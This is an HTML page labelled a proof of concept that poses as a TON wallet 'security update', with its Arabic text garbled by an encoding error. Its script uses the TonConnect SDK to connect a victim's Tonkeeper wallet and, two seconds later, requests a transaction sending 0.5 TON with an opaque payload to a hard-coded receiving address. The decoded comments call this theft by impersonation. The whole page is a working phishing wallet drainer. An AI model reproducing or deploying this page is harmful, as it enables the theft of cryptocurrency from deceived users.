<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Security Update - PoC</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1a1a1a; padding: 2.5rem; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; border: 1px solid #333; max-width: 400px; width: 90%; }
        .icon { width: 80px; height: 80px; background: #0088cc; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        h1 { font-size: 22px; margin-bottom: 10px; color: #fff; }
        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        #connectBtn { background: #fff; color: #000; border: none; padding: 15px 30px; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s; width: 100%; }
        #connectBtn:hover { transform: scale(1.02); background: #e0e0e0; }
        #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #00ff00; background: rgba(0,255,0,0.1); padding: 10px; border-radius: 8px; display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">ğŸ’</div>
        <h1>ØªØ­Ø¯ÙŠØ« Ø£Ù…Ù†ÙŠ Ù„Ù„Ù…Ø­ÙØ¸Ø©</h1>
        <p>Ù‚Ù… Ø¨Ø±Ø¨Ø· Ù…Ø­ÙØ¸ØªÙƒ Ø§Ù„Ø¢Ù† Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù† ÙˆØªÙ„Ù‚ÙŠ ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø£Ø®ÙŠØ±Ø© Ù„Ø¹Ø§Ù… 2026.</p>
        
        <button id="connectBtn">ØªØ­Ø¯ÙŠØ« ÙˆØ§Ù„Ø±Ø¨Ø· Ø§Ù„Ø¢Ù†</button>
        
        <div id="status"></div>
    </div>

    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

    <script>
        const statusDiv = document.getElementById('status');
        const connectBtn = document.getElementById('connectBtn');

        // Ø³ÙŠØªÙ… Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø±Ø§Ø¨Ø· Ø§Ù„Ù€ Gist Ø§Ù„Ø°ÙŠ Ø£Ù†Ø´Ø£ØªÙ‡ Ø£Ù†Øª Ø³Ø§Ø¨Ù‚Ø§Ù‹
        // ØªØ£ÙƒØ¯ Ø£Ù† Ø§Ù„Ø±Ø§Ø¨Ø· ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ "url" ÙŠØ·Ø§Ø¨Ù‚ Ø±Ø§Ø¨Ø· GitHub Pages Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ
        const manifestUrl = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";

        const connector = new TonConnectSDK.TonConnect({
            manifestUrl: manifestUrl
        });

        connectBtn.onclick = async () => {
            statusDiv.style.display = "block";
            statusDiv.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„... ÙŠØ±Ø¬Ù‰ ÙØªØ­ Tonkeeper";

            try {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø±Ø¨Ø·
                await connector.connect({
                    universalLink: 'https://app.tonkeeper.com/ton-connect',
                    bridgeUrl: 'https://bridge.tonapi.io/bridge'
                });
            } catch (e) {
                statusDiv.innerText = "ÙØ´Ù„: " + e.message;
            }
        };

        // Ø¹Ù†Ø¯ Ù†Ø¬Ø§Ø­ Ø§Ù„Ø±Ø¨Ø· (Ø­Ø¯ÙˆØ« Ø§Ù„Ø§Ù†ØªØ­Ø§Ù„)
        connector.onStatusChange(async (wallet) => {
            if (wallet) {
                statusDiv.innerText = "âœ… Ù…ØªØµÙ„: " + wallet.device.appName + "\nØ¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„Ø£Ù…Ø§Ù†...";
                
                // Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø© Ø§Ù„Ù…Ø³Ù…ÙˆÙ…Ø© (Ø§Ù„Ø³Ø±Ù‚Ø©)
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 120,
                    messages: [{
                        address: "0QBMdBOi2OkuHuLvm7lqKar2JFdrKif6prMyHV3ZTZcSGb0c", // Ù…Ø­ÙØ¸ØªÙƒ Ù„Ù„Ø§Ø³ØªÙ„Ø§Ù…
                        amount: "500000000", // 0.5 TON
                        payload: "te6cckEBOQEA/gABWxI0q80AAAAAAAAAAIAJjoJ0Wx0lw9xd83ctRTVexIrtZUT/VNZmQ6u7KbLiQzABAQACAQADAQAEAQAFAQAGAQAHAQAIAQAJAQAKAQALAQAMAQANAQAOAQAPAQAQAQARAQASAQATAQAUAQAVAQAWAQAXAQAYAQAZAQAaAQAbAQAcAQAdAQAeAQAfAQAgAQAhAQAiAQAjAQAkAQAlAQAmAQAnAQAoAQApAQAqAQArAQAsAQAtAQAuAQAvAQAwAQAxAQAyAQAzAQA0AQA1AQA2AQA3AQA4AEsAAAAAgAmOgnRbHSXD3F3zdy1FNV7Eiu1lRP9U1mZDq7spsuJDMNjs78g="
                    }]
                };

                // Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø§Ù„ØªÙˆÙ‚ÙŠØ¹ Ø¨Ø¹Ø¯ 2 Ø«Ø§Ù†ÙŠØ© Ù…Ù† Ø§Ù„Ø±Ø¨Ø·
                setTimeout(async () => {
                    try {
                        await connector.sendTransaction(transaction);
                        statusDiv.innerText = "ØªÙ…Øª Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø¨Ù†Ø¬Ø§Ø­!";
                    } catch (err) {
                        statusDiv.innerText = "ØªÙ… Ø±ÙØ¶ Ø§Ù„ØªÙˆÙ‚ÙŠØ¹.";
                    }
                }, 2000);
            }
        });
    </script>
</body>
</html>